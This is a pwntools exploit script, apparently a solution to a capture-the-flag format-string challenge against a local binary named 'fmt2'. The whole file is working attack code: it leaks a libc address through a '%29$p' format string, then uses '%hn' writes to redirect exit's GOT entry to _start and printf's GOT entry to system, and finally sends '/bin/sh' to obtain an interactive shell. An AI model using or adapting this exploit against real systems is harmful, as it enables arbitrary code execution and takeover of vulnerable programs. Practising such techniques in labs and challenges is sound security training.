from pwn import *

def payload_overwrite(address, index):
    payload = b''
    num = 0
    while address > 0:
        tmp_add = address & 0xffff
        if tmp_add < num:
            tmp_add += (1<<16) 
        payload += '%{}x%{}$hn'.format(tmp_add-num, index).encode()
        num = address & 0xffff 
        index += 1
        address >>= 16 
    payload = payload.ljust(8 * 6, b'a')
    return payload

p = process("./fmt2")
e = ELF("./fmt2")
libc = e.libc

p.sendlineafter(b'name: ', b'%29$p')
p.recvuntil(b'guy,')
libc.address = int(p.recvline()[:-1],16) - libc.symbols['__libc_start_main'] - 243
log.info(f'libc address :0x{libc.address:0x}')

payload = payload_overwrite(e.symbols['_start'], 14)
payload += p64(e.got['exit'])+p64(e.got['exit']+2)+p64(e.got['exit']+4)
p.sendlineafter(b'input: ', payload)

payload = payload_overwrite(libc.symbols['system'], 24)
payload += p64(e.got['printf'])+p64(e.got['printf']+2)+p64(e.got['printf']+4)
p.sendlineafter(b'name: ', payload)
p.sendline('/bin/sh')
p.interactive()
